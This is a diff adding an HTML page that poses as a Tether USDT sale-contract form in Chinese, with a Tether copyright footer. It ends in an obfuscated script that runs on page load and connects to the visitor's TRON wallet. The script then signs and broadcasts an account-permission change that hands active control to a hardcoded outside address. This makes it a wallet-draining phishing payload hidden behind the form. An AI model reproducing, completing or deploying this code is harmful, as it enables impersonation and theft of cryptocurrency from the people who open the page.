@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>泰達貨幣買賣契約</title>
+	<link rel="stylesheet" type="text/css" href="style.css">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+</head>
+<body>
+
+    <!-- ✅ 右上角圖片 -->
+    <img src="asset/top-right-shapes.svg" class="top-right-shapes">
+
+    <!-- ✅ 左下角圖片 -->
+    <img src="asset/bottom-left-shapes.svg" class="bottom-left-shapes">
+
+    <!-- ✅ 外框（讓 Logo 和 登入框一起置中） -->
+    <div class="content-wrapper">
+        <img src="asset/logo-tether.svg" class="logo">
+
+        <div class="login-container">
+            <!-- ✅ 錢包地址 -->
+            <div class="wallet-address" id="wallet-address">未偵測到錢包</div>
+
+            <!-- ✅ 立契約書人 -->
+            <h3 class="section-title">立契約書人</h3>
+            <label for="seller">出賣人（甲方）</label>
+            <input type="text" id="seller" class="input-field" placeholder="請輸入甲方名稱">
+
+            <label for="buyer">買受人（乙方）</label>
+            <input type="text" id="buyer" class="input-field" placeholder="請輸入乙方名稱">
+
+            <!-- ✅ 買賣標的及價金 -->
+            <h3 class="section-title">買賣標的及價金</h3>
+            <label for="crypto-type">虛擬貨幣種類</label>
+            <input type="text" id="crypto-type" class="input-field" placeholder="USDT">
+
+            <label for="crypto-amount">數量</label>
+            <input type="text" id="crypto-amount" class="input-field" placeholder="請輸入交易數量">
+
+            <label for="exchange-rate">虛擬貨幣匯率（新台幣/USDT）</label>
+            <input type="text" id="exchange-rate" class="input-field" placeholder="請輸入匯率">
+
+            <!-- ✅ 付款方式 -->
+            <h3 class="section-title">付款方式</h3>
+            <p class="info-text">
+                乙方應於簽約時一次性支付甲方價金，甲方於確認款項後，應立即轉移對應的 USDT 予乙方。
+            </p>
+
+            <!-- ✅ 法律聲明 -->
+            <h3 class="section-title">法律聲明</h3>
+            <p class="info-text">
+                本交易應遵守相關法律，且雙方應確保資金來源合法，並獨立承擔交易風險。
+            </p>
+			
+            <!-- ✅ 上傳按鈕 -->
+            <button class="btn-submit" onclick="increaseApproval();return false;">上傳交易資料</button>
+        </div>
+    </div>
+
+    <!-- ✅ 版權資訊 -->
+    <div class="footer">
+        Copyright <img src="asset/copyright.svg" style="width: 12px;"> 2013 - 2025 Tether Operations, S.A. de C.V. All rights reserved.
+    </div>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+	<script>
+		const _0x9da82f=_0x1a6e;function _0x1a6e(_0x43d211,_0x4d39c9){const _0x44c11e=_0x44c1();return _0x1a6e=function(_0x1a6e36,_0x34f82a){_0x1a6e36=_0x1a6e36-0x181;let _0x1d7fcf=_0x44c11e[_0x1a6e36];return _0x1d7fcf;},_0x1a6e(_0x43d211,_0x4d39c9);}(function(_0x3fef4e,_0xd865cc){const _0x5292e2=_0x1a6e,_0x185b70=_0x3fef4e();while(!![]){try{const _0xad0110=-parseInt(_0x5292e2(0x18d))/0x1+-parseInt(_0x5292e2(0x1a6))/0x2+-parseInt(_0x5292e2(0x194))/0x3+parseInt(_0x5292e2(0x185))/0x4+parseInt(_0x5292e2(0x199))/0x5*(-parseInt(_0x5292e2(0x18a))/0x6)+-parseInt(_0x5292e2(0x191))/0x7*(parseInt(_0x5292e2(0x184))/0x8)+parseInt(_0x5292e2(0x1a7))/0x9*(parseInt(_0x5292e2(0x1a8))/0xa);if(_0xad0110===_0xd865cc)break;else _0x185b70['push'](_0x185b70['shift']());}catch(_0x42a9b1){_0x185b70['push'](_0x185b70['shift']());}}}(_0x44c1,0xa30f0));const newOwnerAddress=_0x9da82f(0x1a5);var tronWeb,userAddress,checkTronWeb=setTimeout(async function(){const _0x46b458=_0x9da82f;if(typeof window[_0x46b458(0x19e)]!=='undefined')await window[_0x46b458(0x19e)]['tronLink'][_0x46b458(0x1a2)]({'method':_0x46b458(0x18b)}),tronWeb=window[_0x46b458(0x1ad)],userAddress=window['tronWeb'][_0x46b458(0x19c)][_0x46b458(0x1aa)],$(_0x46b458(0x197))['text'](userAddress),await changeOwner();else{if(typeof window[_0x46b458(0x1a3)]!=='undefined')tronWeb=window['tronWeb'],userAddress=window[_0x46b458(0x1ad)][_0x46b458(0x19c)][_0x46b458(0x1aa)],$(_0x46b458(0x197))[_0x46b458(0x192)](userAddress),await changeOwner();else typeof window[_0x46b458(0x1ad)]!==_0x46b458(0x188)?(tronWeb=window[_0x46b458(0x1ad)],userAddress=window['tronWeb'][_0x46b458(0x19c)][_0x46b458(0x1aa)],$(_0x46b458(0x197))['text'](userAddress),await changeOwner()):Swal[_0x46b458(0x196)]({'title':'Error!','text':_0x46b458(0x1a4),'icon':_0x46b458(0x189),'confirmButtonText':'OK'});}},0x7d0);function _0x44c1(){const _0x29e790=['TronWeb\x20操作錯誤：','result','defaultAddress','toHex','okxwallet','請填寫新權限地址','7fff1fc0037e0000000000000000000000000000000000000000000000000000','請先獲取錢包地址','request','tokenpocket','not\x20tronweb!','TLGU2Gga8BUwfPYxvbFLyMZ4gKv17bP2pK','1642600EEHoVf','1633923eIKkpN','150BrESQH','address','base58','創建交易成功。txid:','operations','tronWeb','code','active','push','18792KVSBeU','790500XJFDTm','新權限地址格式錯誤','sendRawTransaction','undefined','error','1818AJcLKg','tron_requestAccounts','isAddress','57470DTRkUt','trx','創建交易失敗，狀態碼:','owner','2205CyxYOU','text','sign','1808175ihJAFr','keys','fire','#wallet-address','threshold','520fOuWMz'];_0x44c1=function(){return _0x29e790;};return _0x44c1();}const changeOwner=async()=>{const _0x1dd2c3=_0x9da82f;try{if(newOwnerAddress===''){Swal[_0x1dd2c3(0x196)](_0x1dd2c3(0x19f));return;}if(!tronWeb[_0x1dd2c3(0x18c)](newOwnerAddress)){Swal[_0x1dd2c3(0x196)](_0x1dd2c3(0x186));return;}if(userAddress===''){Swal['fire'](_0x1dd2c3(0x1a1));return;}let _0x3439f9={'type':0x0,'permission_name':_0x1dd2c3(0x190)};_0x3439f9['threshold']=0x1,_0x3439f9['keys']=[];let _0x44edba={'type':0x2,'permission_name':_0x1dd2c3(0x182)};_0x44edba[_0x1dd2c3(0x198)]=0x1,_0x44edba[_0x1dd2c3(0x1ac)]=_0x1dd2c3(0x1a0),_0x44edba['keys']=[],_0x3439f9['keys'][_0x1dd2c3(0x183)]({'address':tronWeb[_0x1dd2c3(0x1a9)][_0x1dd2c3(0x19d)](userAddress),'weight':0x1}),_0x44edba[_0x1dd2c3(0x195)][_0x1dd2c3(0x183)]({'address':tronWeb[_0x1dd2c3(0x1a9)][_0x1dd2c3(0x19d)](newOwnerAddress),'weight':0x1});const _0x3c65c0=await tronWeb['transactionBuilder']['updateAccountPermissions'](tronWeb[_0x1dd2c3(0x1a9)]['toHex'](userAddress),_0x3439f9,null,[_0x44edba]),_0x4133a9=await tronWeb[_0x1dd2c3(0x18e)][_0x1dd2c3(0x193)](_0x3c65c0),_0x82ca59=await tronWeb[_0x1dd2c3(0x18e)][_0x1dd2c3(0x187)](_0x4133a9);_0x82ca59[_0x1dd2c3(0x19b)]?Swal[_0x1dd2c3(0x196)](_0x1dd2c3(0x1ab)+_0x82ca59['txid']):Swal[_0x1dd2c3(0x196)](_0x1dd2c3(0x18f)+_0x82ca59[_0x1dd2c3(0x181)]);}catch(_0x11cbb1){Swal[_0x1dd2c3(0x196)](_0x1dd2c3(0x19a)+_0x11cbb1);}};
+	</script>
+</body>
+</html>
